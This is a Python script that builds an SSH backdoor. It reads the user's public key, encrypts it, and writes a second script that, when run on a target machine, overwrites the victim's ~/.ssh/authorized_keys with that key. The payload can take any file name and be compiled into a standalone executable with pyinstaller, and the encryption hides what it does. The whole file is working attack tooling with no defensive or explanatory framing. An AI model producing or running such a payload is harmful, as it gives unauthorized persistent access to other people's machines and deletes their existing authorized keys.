#!/bin/python3.9
import base64
import getpass
import os
from cryptography.fernet import Fernet

username = getpass.getuser()
sshkey_path = f"/home/{username}/.ssh"
os.chdir(sshkey_path)
ssh_keyfile = "id_rsa.pub"
with open(ssh_keyfile, "rb") as sshkey:
    ssh_bytes = sshkey.read()

output_dir = input("Enter the output directory: ")
os.chdir(output_dir)

key = Fernet.generate_key()
encoded_key = base64.b64encode(key)
sshkey_encrypted = Fernet(key).encrypt(ssh_bytes)

text = f'''
#!/bin/python3.9
import getpass
import os
import base64
from cryptography.fernet import Fernet

user = getpass.getuser()
sshkey_encrypted = {sshkey_encrypted}
encoded_key = {encoded_key}
key = base64.b64decode(encoded_key)
sshkey_decrypted = Fernet(key).decrypt(sshkey_encrypted)

os.chdir("/home/"+user+"/.ssh")
with open("authorized_keys", "wb") as sshkey:
    sshkey.write(sshkey_decrypted)
'''

filename = input("What would you like to name your file? ")
with open(filename, "w") as thefile:
    thefile.write(text)
    print("File Created!")
    
cont = input("Would you like to compile an executable? ")
if cont == "y":
    os.system(f"pyinstaller --onefile {filename}")
elif cont == "n":
    exit()